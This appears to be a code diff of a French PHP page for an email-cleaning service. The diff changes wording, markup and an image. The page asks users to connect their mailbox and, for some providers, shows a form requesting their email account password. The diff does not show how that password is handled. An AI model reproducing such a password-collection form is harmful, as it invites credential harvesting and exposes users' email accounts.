@@ -9,7 +9,7 @@
 
     session_start();
     if(!isset($_REQUEST["email"])){
-       echo" <h2>Connecter votre boite mail</h2>
+       echo" <h2>Connectez votre boîte mail</h2>
        <form method='post'>
            <div><input type='text' placeholder='Prénom' name='fname' id='fname' required>
            <input type='text' placeholder='Nom' name='lname' id='lname' required>
@@ -70,11 +70,11 @@
                 <a href='#'>Je n'ai pas activé la double auth</a>";
             break;
             case "simple":
-                echo "La méthode simple <br><form method='post'><label for='password'>Mot de passe de votre email :</label><br><input type='password' name='password' placeholder='Mot de passe' required><button class='btn btn_small' type='submit'>Submit</button></form>";
+                echo "<br><form method='post'><label for='password'>Mot de passe de votre email :</label><br><input type='password' name='password' placeholder='Mot de passe' required><button class='btn btn_small' type='submit'>Submit</button></form>";
             break;
             
             default:
-                echo "votre email n'est pas encore supporté essayez en un autre";//si email existe pas et qu il n est pas. ce fourniseur n est pas encore supportee utilsier un email de la liste suivante
+                echo "<p>votre email n'est pas encore supporté essayez en un autre</p>";//si email existe pas et qu il n est pas. ce fourniseur n est pas encore supportee utilsier un email de la liste suivante
             break;
         }
         if(isset($_REQUEST["password"])){
@@ -104,7 +104,7 @@
 ?>
         </div>
             <div class="login__right">
-                <img src="./media/logofooter/cleanfox.png" alt="monstee">
+                <img src="./media/GIF/SPAM_new.gif" alt="monstee" >
             </div>
     </div>
 </body>
